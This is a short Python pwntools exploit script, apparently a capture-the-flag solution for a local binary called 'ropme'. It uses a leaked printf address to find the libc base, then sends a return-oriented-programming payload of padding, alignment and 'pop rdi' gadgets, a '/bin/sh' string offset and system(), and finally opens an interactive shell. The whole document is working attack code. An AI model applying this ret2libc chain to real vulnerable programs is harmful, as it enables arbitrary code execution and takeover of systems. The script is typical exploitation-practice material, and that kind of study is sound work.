from pwn import *

p = process("./ropme")

pause()

p.recvuntil(b" - ")
printf_addr = int(p.recvuntil(b" -\n", drop=True), base=16)

libc = ELF("./libc.so.6")
libc.address = printf_addr - libc.symbols["printf"]

print(hex(libc.address))

payload = b"A" * 16

payload += p64(libc.address + 0x001afc8c) # align
payload += p64(libc.address + 0x001ae710) # pop rdi
payload += p64(libc.address + 1881135)
payload += p64(libc.symbols["system"])

p.sendlineafter(b"ROP!\n", payload)

p.interactive()